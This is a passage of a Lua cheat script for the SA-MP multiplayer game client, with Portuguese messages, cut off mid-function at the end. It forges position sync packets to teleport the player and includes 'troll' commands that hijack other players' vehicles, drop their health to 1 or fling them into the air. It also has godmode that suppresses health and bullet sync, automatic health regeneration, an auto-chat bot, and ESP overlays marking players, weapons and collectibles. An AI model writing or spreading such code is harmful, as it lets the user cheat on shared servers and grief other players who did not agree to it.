            local dist = getDistanceBetweenCoords2d(Xp, Yp, X, Y)
            if dist > 3 then
                while dist > 3 do
                    if X > Xp then
                        X = X - 2
                    else
                        X = X + 2
                    end
                    if Y > Yp then
                        Y = Y - 2
                    else
                        Y = Y + 2
                    end
                    if Z > Zp then
                        Z = Z - 1
                    else
                        Z = Z + 1
                    end
                    local Zt = getGroundZFor3dCoord(X, Y, Z)
                    local data = samp_create_sync_data('player')
                    data.health = getCharHealth(PLAYER_PED)
                    data.armor = getCharArmour(PLAYER_PED)
                    data.weapon = getCurrentCharWeapon(PLAYER_PED)
                    data.position.x = X
                    data.position.y = Y
                    data.position.z = Z
                    data.send()
                    dist = getDistanceBetweenCoords2d(Xp, Yp, X, Y)
                end
            end
            local data = samp_create_sync_data('player')
            data.health = getCharHealth(PLAYER_PED)
            data.armor = getCharArmour(PLAYER_PED)
            data.weapon = getCurrentCharWeapon(PLAYER_PED)
            data.position.x, data.position.y, data.position.z = getCharCoordinates(ped)
            data.send()
            wait(50)
            X, Y, Z = getCharCoordinates(PLAYER_PED)
            dist = getDistanceBetweenCoords2d(Xp, Yp, X, Y)
            if dist > 3 then
                while dist > 2 do
                    if Xp > X then
                        Xp = Xp - 2
                    else
                        Xp = Xp + 2
                    end
                    if Yp > Y then
                        Yp = Yp - 2
                    else
                        Yp = Yp + 2
                    end
                    if Zp > Z then
                        Zp = Zp - 1
                    else
                        Zp = Zp + 1
                    end
                    local Zt = getGroundZFor3dCoord(Xp, Yp, Zp)
                    local data = samp_create_sync_data('player')
                    data.health = getCharHealth(PLAYER_PED)
                    data.armor = getCharArmour(PLAYER_PED)
                    data.weapon = getCurrentCharWeapon(PLAYER_PED)
                    data.position.x = Xp
                    data.position.y = Yp
                    data.position.z = Zp
                    data.send()
                    dist = getDistanceBetweenCoords2d(Xp, Yp, X, Y)
                end
            end
            local data = samp_create_sync_data('player')
            data.health = getCharHealth(PLAYER_PED)
            data.armor = getCharArmour(PLAYER_PED)
            data.weapon = getCurrentCharWeapon(PLAYER_PED)
            data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
            data.send()
            printStringNow('sended sync', 1000)
            wait(50)
            process = false
        end
    end
    setCharProofs(PLAYER_PED, false, false, false, false, false)
end
function sampev.onServerMessage(color, message)
    if autocx[0] and message:find("Juros Bancario:") and not testecx then
        testecx = true

        lua_thread.create(function()
            wait(100)
            sampAddChatMessage("Pegando Caixinha...", 16776960)
            wait(math.random(1200, 3000))
            sampSendChat("/caixinha")
            wait(100)
            sampAddChatMessage("Aguardando o proximo!", 16776960)

            testecx = false
        end)
    end
end
function mcar_func(type, param)
    if type == "mcar" then
        local param1, param2 = param:match('(.+) (.+)')
        if not sampIsPlayerConnected(param1) then
            sampAddChatMessage("{ffffff}Jogador com esse ID nao esta conectado!", -1)
        else
            if sampIsPlayerPaused(param1) then
                sampAddChatMessage("{ffffff}Jogador esta em AFK!", -1)
            else
                local strim, ped = sampGetCharHandleBySampPlayerId(param1)
                if not strim then
                    sampAddChatMessage("{ffffff}Jogador nao encontrado no servidor!", -1)
                else
                    local x, u, i = getCharCoordinates(PLAYER_PED)
                    local x, y, z = getCharCoordinates(ped)
                    local result, handle = sampGetCarHandleBySampVehicleId(param2)
                    if not result then
                        sampAddChatMessage("{ffffff}Nenhum carro encontrado com esse ID!", -1)    
                    else
                        warpCharIntoCar(PLAYER_PED, handle)
                        setCarHealth(handle, 1)
                        setCharCoordinates(PLAYER_PED, x, y, z + 4)
                        wait(60)
                        warpCharFromCarToCoord(PLAYER_PED, x, u, i)
                        sampAddChatMessage("{ffffff}Voce trollou o jogador ID "..param1.." com o carro ID "..param2.."!", -1)
                    end
                end
            end
        end
    end
end

function trollVehicle()
    local pid = tonumber(ffi.string(vhtroll))
    if not pid then
        sampAddChatMessage('{0000ff} ID nao valido', -1)
        return
    end

    local sr1, ptar = sampGetCharHandleBySampPlayerId(pid)
    if not sr1 or not doesCharExist(ptar) then
        sampAddChatMessage('{0000ff} Jogador nao foi encontrado', -1)
        return
    end

    local veh = storeCarCharIsInNoSave(ptar)
    local myveh = storeCarCharIsInNoSave(PLAYER_PED)
    local _1, i1 = sampGetVehicleIdByCarHandle(veh)
    local _2, i2 = sampGetVehicleIdByCarHandle(myveh)
    if not _1 then
        sampAddChatMessage('{0000ff} O jogador nao esta em um veiculo', -1)
        return
    elseif not _2 then
        sampAddChatMessage('{0000ff} Voce nao esta em um veiculo ', -1)
        return
    end

    lua_thread.create(function()
        warpCharIntoCar(PLAYER_PED, veh)
        local cx, cy, cz = getCarCoordinates(veh)
        wait(400)
        setCarCoordinates(veh, cx, cy, cz + 40)
        wait(400)
        warpCharIntoCar(PLAYER_PED, myveh)
    end)
end
function autohpFunction()
    lua_thread.create(function()
        while aim.CheckBox.autohp[0] do
            wait(100)
            local _, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
            local hp = sampGetPlayerHealth(myid)
            if hp < 100 then
                setCharHealth(PLAYER_PED, hp + 3)
                printStringNow('Regenerando... ['..hp..' >> '..(hp + 3)..']', 500)
            end
        end
    end)
    sampAddChatMessage('{999900}[S-PROJECT]: {FF0000}Regeneracao {33FF00}[Ativada].', -1)
end

function disableAutohp()
    sampAddChatMessage('{999900}[S-PROJECT]: {FF0000}Regeneracao {FF0000}[Desativada].', -1)
end

function sampev.onSendVehicleSync(data)
    if aim.CheckBox.teste13[0] then
        local var_31_0, var_31_1, var_31_2 = getCharCoordinates(PLAYER_PED)
        data.position.x = var_31_0
        data.position.y = var_31_1
        data.position.z = var_31_2 - 5
    else
        return true
    end
    if inCarNop then return false end
    if justGotInCar then
        justGotInCar = false
        lastHP = data.vehicleHealth
        return
    end

    if mult == 0 then
        local newHP = data.vehicleHealth
        if newHP < lastHP then
            local damageTaken = lastHP - newHP
            local reducedDamage = damageTaken * mult
            local hp = newHP + damageTaken - reducedDamage
            hp = math.max(newHP, hp)
            setCarHealth(storeCarCharIsInNoSave(1), hp)
            data.vehicleHealth = hp
        end
        lastHP = newHP
    end
    if aim.CheckBox.teste62[0] then
    end
    if ebalka and chlen then
        data.position = {ax, ay, az}
        data.quaternion = {0, 50, 0, 0}
    end
    if aim.CheckBox.teste37[0] and isCharInAnyCar(PLAYER_PED) then
        return false
    end
end
function sampev.onSendUnoccupiedSync(arg_53_0)
	if aim.CheckBox.teste37[0] and isCharInAnyCar(PLAYER_PED) and getDriverOfCar(getCarCharIsUsing(1)) == 1 then
		return false
	end
end
function fileExists(arg_3_0)
	local var_3_0 = io.open(arg_3_0, "r")

	if var_3_0 then
		io.close(var_3_0)

		return true
	else
		return false
	end
end
function sampev.onSendPassengerSync(arg_54_0)
	if aim.CheckBox.teste37[0] and isCharInAnyCar(PLAYER_PED) and getDriverOfCar(getCarCharIsUsing(1)) == 1 then
		return false
	end
end

function sampev.onSendEnterVehicle(arg_55_0, arg_55_1)
	if aim.CheckBox.teste37[0] and arg_55_1 == false then
		lua_thread.create(function()
			wait(0)
			sampSendEnterVehicle(arg_55_0, false)
			wait(1500)
			warpCharIntoCar(PLAYER_PED, select(2, sampGetCarHandleBySampVehicleId(arg_55_0)))
		end)
	end

	return false
end
function drawBar(arg_20_0, arg_20_1, arg_20_2, arg_20_3, arg_20_4, arg_20_5, arg_20_6, arg_20_7, arg_20_8)
	renderDrawBoxWithBorder(arg_20_0, arg_20_1, arg_20_2, arg_20_3, arg_20_5, arg_20_6, 4278190080)
	renderDrawBox(arg_20_0 + arg_20_6, arg_20_1 + arg_20_6, arg_20_2 / 100 * arg_20_8 - arg_20_6 * 2, arg_20_3 - 2 * arg_20_6, arg_20_4)

	local var_20_0 = renderGetFontDrawTextLength(arg_20_7, tostring(arg_20_8))
	local var_20_1 = renderGetFontDrawHeight(arg_20_7)

	renderFontDrawText(arg_20_7, tostring(arg_20_8), arg_20_0 + arg_20_2 / 2 - var_20_0 / 2, arg_20_1 + arg_20_3 / 2 - var_20_1 / 2, 4294967295)
end
function sampev.onRequestSpawnResponse()
	if aim.CheckBox.teste14[0] then
		return false
	end
end
function sampev.onBulletSync()
	if aim.CheckBox.teste14[0] then 
		return false
	end
end
function renderFov()
	while true do
		wait(0)

		if aim.CheckBox.teste14[0] then
			setCharProofs(PLAYER_PED, true, true, true, true, true)
		else
			setCharProofs(PLAYER_PED, false, false, false, false, false)
		end
	end
end

lua_thread.create(renderFov)

function sampev.onSetPlayerHealth()
	if aim.CheckBox.teste14[0] then
		return false
	end
end
function sampev.onVehicleSync(id, vehid, data)
    if data.leftRightKeys ~= 0 then
        if data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
            players[id] = "Mobile"
        end
    end
end
function GetPedPro()
    local maxDistance = 450
    local nearestPED = -1
    
    for i = 0, sampGetMaxPlayerId(true) do
        if sampIsPlayerConnected(i) then
            local find, handle = sampGetCharHandleBySampPlayerId(i)
            if find then
                if isCharOnScreen(handle) then
                    local crosshairPos = {convertGameScreenCoordsToWindowScreenCoords(339.1, 179.1)}
                    local enPos = {getCharCoordinates(handle)}
                    local bonePos = {convert3DCoordsToScreen(enPos[1], enPos[2], enPos[3])}
                    local distance = math.sqrt((math.pow((bonePos[1] - crosshairPos[1]), 2) + math.pow((bonePos[2] - crosshairPos[2]), 2)))
                    
                    if distance < 1.0 or distance > 80.0 then 
                        check = true 
                    else 
                        check = false 
                    end
                    
                    if not check then
                        local myPos = {getCharCoordinates(playerPed)}
                        local distance = getDistanceBetweenCoords3d(myPos[1], myPos[2], myPos[3], enPos[1], enPos[2], enPos[3])
                        
                        if distance < maxDistance then
                            nearestPED = i
                            maxDistance = distance
                        end
                    end
                end
            end
        end
    end
    return nearestPED
end
function allobj()
    for iter_48_64, iter_48_65 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_48_65) then
            local var_48_309, var_48_310, var_48_311, var_48_312 = getObjectCoordinates(iter_48_65)
            local var_48_313, var_48_314 = convert3DCoordsToScreen(var_48_310, var_48_311, var_48_312)
            local var_48_315, var_48_316, var_48_317 = getCharCoordinates(PLAYER_PED)
            local var_48_318, var_48_319 = convert3DCoordsToScreen(var_48_315, var_48_316, var_48_317)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_48_310, var_48_311, var_48_312, var_48_315, var_48_316, var_48_317))

            local var_48_320 = getObjectModel(iter_48_65)

            renderDrawLine(var_48_318, var_48_319, var_48_313, var_48_314, 1.1, 4291821568)
            renderFontDrawText(fontwarp, "Objeto ID: {00FF00}" .. var_48_320 .. "\n{ff0000}Distancia: " .. distance, var_48_313, var_48_314, -1)
        end
    end
end
function ovop()
    for iter_48_54, iter_48_55 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_48_55) then
            local var_48_262, var_48_263, var_48_264, var_48_265 = getObjectCoordinates(iter_48_55)
            local var_48_266, var_48_267 = convert3DCoordsToScreen(var_48_263, var_48_264, var_48_265)
            local var_48_268 = getObjectModel(iter_48_55)
            local var_48_269, var_48_270, var_48_271 = getCharCoordinates(PLAYER_PED)
            local var_48_272, var_48_273 = convert3DCoordsToScreen(var_48_269, var_48_270, var_48_271)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_48_263, var_48_264, var_48_265, var_48_269, var_48_270, var_48_271))

            if var_48_268 == 19345 or var_48_268 == 19344 or var_48_268 == 19343 or var_48_268 == 19341 or var_48_268 == 19342 then
                renderDrawLine(var_48_272, var_48_273, var_48_266, var_48_267, 1.1, 4291821568)
                renderFontDrawText(fontwarp, "Ovo! \n{ff0000}Distancia: " .. distance, var_48_266, var_48_267, -1)
            end
        end
    end
end
function cxhallo()
    for iter_48_34, iter_48_35 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_48_35) then
            local var_48_153, var_48_154, var_48_155, var_48_156 = getObjectCoordinates(iter_48_35)
            local var_48_157, var_48_158 = convert3DCoordsToScreen(var_48_154, var_48_155, var_48_156)
            local var_48_159 = getObjectModel(iter_48_35)
            local var_48_160, var_48_161, var_48_162 = getCharCoordinates(PLAYER_PED)
            local var_48_163, var_48_164 = convert3DCoordsToScreen(var_48_160, var_48_161, var_48_162)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_48_154, var_48_155, var_48_156, var_48_160, var_48_161, var_48_162))

            if var_48_159 == 19918 then
                renderDrawLine(var_48_163, var_48_164, var_48_157, var_48_158, 1.1, 4291821568)
                renderFontDrawText(fontwarp, "Caixa Surpresa {8B4513}Halloween{ffffff}! \n{ff0000}Distancia: " .. distance, var_48_157, var_48_158, -1)
            end
        end
    end
end
function rarmas()
    for iter_18_52, iter_18_53 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_18_53) then
            local var_18_283, var_18_284, var_18_285, var_18_286 = getObjectCoordinates(iter_18_53)
            local var_18_287, var_18_288 = convert3DCoordsToScreen(var_18_284, var_18_285, var_18_286)
            local var_18_289 = getObjectModel(iter_18_53)
            local var_18_290, var_18_291, var_18_292 = getCharCoordinates(PLAYER_PED)
            local var_18_293, var_18_294 = convert3DCoordsToScreen(var_18_290, var_18_291, var_18_292)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_18_284, var_18_285, var_18_286, var_18_290, var_18_291, var_18_292))

            if var_18_289 == 333 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Golf Club \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 334 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Nightstick \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 335 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Knife\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 336 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Baseball Bat\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 337 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Shovel\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 338 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Pool Cue\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 339 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Katana\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 341 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Chainsaw\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 321 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Purple Dildo\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 322 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Dildo\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 323 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Vibrator\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 324 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Silver Vibrator\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 325 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Flowers\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 326 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Cane\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 342 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Grenade\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 343 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Tear Gas\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 344 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Molotov Cocktail\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 346 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}9mm\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 347 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Silenced 9mm\t\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 347 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Silenced 9mm\t\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 348 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Deagle \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 349 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Shotgun \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 350 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Sawnoff Shotgun \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 351 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Combat Shotgun \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 352 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Micro SMG/Uzi \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 353 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}MP5 \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 355 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}AK-47 \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 356 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}M4 \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 372 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Tec-9 \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 357 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Country Rifle \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 358 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Sniper Rifle\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 359 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}RPG\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 360 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}HS Rocket\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 361 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Flamethrower\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 362 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Minigun\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 363 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Satchel Charge\t\t\t \n{FFFFFF}Distancia:{FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 364 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Detonator\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 365 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Spraycan\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 366 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Fire Extinguisher\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 367 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Camera\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 368 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Night Vision Goggles\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 369 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Thermal Goggles\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 371 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Parachute\t\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end

            if var_18_289 == 370 then
                renderDrawLine(var_18_293, var_18_294, var_18_287, var_18_288, 1.1, 4291821568)
                renderFontDrawText(font, "{00FF00}Jetpack\t\t\t\t\t\t \n{FFFFFF}Distancia: {FF0000}" .. distance, var_18_287, var_18_288, -1)
            end
        end
    end
end
function tesouro()
    for iter_48_44, iter_48_45 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_48_45) then
            local var_48_202, var_48_203, var_48_204, var_48_205 = getObjectCoordinates(iter_48_45)
            local var_48_206, var_48_207 = convert3DCoordsToScreen(var_48_203, var_48_204, var_48_205)
            local var_48_208 = getObjectModel(iter_48_45)
            local var_48_209, var_48_210, var_48_211 = getCharCoordinates(PLAYER_PED)
            local var_48_212, var_48_213 = convert3DCoordsToScreen(var_48_209, var_48_210, var_48_211)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_48_203, var_48_204, var_48_205, var_48_209, var_48_210, var_48_211))

            if var_48_208 == 1550 then
                renderDrawLine(var_48_212, var_48_213, var_48_206, var_48_207, 1.1, 4291821568)
                renderFontDrawText(fontwarp, "{FFFF00}Tesouro{ffffff}! \n{ff0000}Distancia: " .. distance, var_48_206, var_48_207, -1)
            end
        end
    end
end

function cxrp()
    for _, v in pairs(getAllObjects()) do
        if isObjectOnScreen(v) then
            local result, oX, oY, oZ = getObjectCoordinates(v)
            local x1, y1 = convert3DCoordsToScreen(oX,oY,oZ)
            local objmodel = getObjectModel(v)
            local x2,y2,z2 = getCharCoordinates(PLAYER_PED)
            local x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
            local distance = string.format("%.0f", getDistanceBetweenCoords3d(oX,oY,oZ, x2, y2, z2))
            if objmodel == 19058 then 
                renderDrawLine(x10, y10, x1, y1, 1.1, 0xFFD00000) 
                renderFontDrawText(fontwarp,"Caixa RP!\n{ff0000}Distancia: "..distance, x1, y1, -1) 
            end
        end
    end
end
function espcaixa2d()
    for i = 0, sampGetMaxPlayerId() do
        if sampIsPlayerConnected(i) then
            local result, ped = sampGetCharHandleBySampPlayerId(i)
            if result and doesCharExist(ped) and isCharOnScreen(ped) then
                local x, y, z = getCharCoordinates(PLAYER_PED)
                local px, py, pz = getCharCoordinates(ped)
                local x1, y1 = convert3DCoordsToScreen(x, y, z)
                local x2, y2 = convert3DCoordsToScreen(px, py, pz)

                renderDrawLine(x1, y1, x2, y2, 1, 0xFF0027FF)
                renderDrawBoxWithBorder(x2 - 30, y2 - 35, 60, 90, 0x00FFFFFF, 1, 0xFFF00F00)
                renderFontDrawText(font, "ID: " .. i .. "\nNick: " .. sampGetPlayerNickname(i), x2, y2 - 60, 0xFF00FFC5)
            end
        end
    end
end
function renderTargetBox(x, y, z, coefZUP, coefZDOWN,color)
    if color == nil then color = 0xAA00CC00 end
    if isPointOnScreen(x,y,z,0) then
        local mx, my, mz = getCharCoordinates(1)
        local radius = 150
        local coef = getDistanceBetweenCoords3d(mx,my,mz,x,y,z)
        local coef2 = getDistanceBetweenCoords3d(mx,my,mz,x,y,z)
        local coef = coef-(coef*2)
        local coef2 = coef2-(coef2*2)
        if coef > -25 then
            coef = -25
            coef2 = -12
            z = z + coefZUP
            local cx, cy = convert3DCoordsToScreen(x,y,z)
            renderDrawLine(cx+coef+60,cy,cx-coef-10,cy,3,color)
            renderDrawLine(cx-coef-60,cy-3,cx+coef+10,cy-3,3,color)
            renderDrawLine(cx+coef+60,cy,cx+coef+60,cy-coef,3,color)
            renderDrawLine(cx-coef-60,cy,cx-coef-60,cy-coef,3,color)
            z = z - coefZDOWN
            local cx, cy = convert3DCoordsToScreen(x,y,z)
            renderDrawLine(cx+coef+60,cy,cx-coef-10,cy,3,color)
            renderDrawLine(cx-coef-60,cy-3,cx+coef+10,cy-3,3,color)
            renderDrawLine(cx+coef+60,cy,cx+coef+60,cy+coef,3,color)
            renderDrawLine(cx-coef-60,cy,cx-coef-60,cy+coef,3,color)
        elseif coef < -25 then
            coef = -1
            coef2 = -55
            z = z + coefZUP
            local cx, cy = convert3DCoordsToScreen(x,y,z) 
            renderDrawLine(cx+coef+coef*5,  cy,   cx-coef+coef2/2.3,  cy,         3,color)
            renderDrawLine(cx-coef-coef*2,  cy-3, cx+2+coef-coef2/3,  cy-3,       3,color)
            renderDrawLine(cx+coef+coef2/3,  cy,   cx+coef+coef2/3,   cy-coef+20, 3,color)
            renderDrawLine(cx-coef-coef2/3,  cy,   cx-coef-coef2/3,   cy-coef+20, 3,color)
            z = z - coefZDOWN
            local cx, cy = convert3DCoordsToScreen(x,y,z) 
            renderDrawLine(cx+coef+coef2/2.5,  cy,   cx+coef+coef2/2.5,   cy-coef-20, 3,color)
            renderDrawLine(cx-coef-coef2/3,  cy,   cx-coef-coef2/3,   cy-coef-20, 3,color)
            renderDrawLine(cx+coef+coef*5,  cy,   cx-coef+coef2/2.3,  cy,         3,color)
            renderDrawLine(cx-coef-coef*2,  cy-3, cx+2+coef-coef2/3,  cy-3,       3,color)
        end
    end
end
function cxprata()
    for iter_48_50, iter_48_51 in pairs(getAllObjects()) do
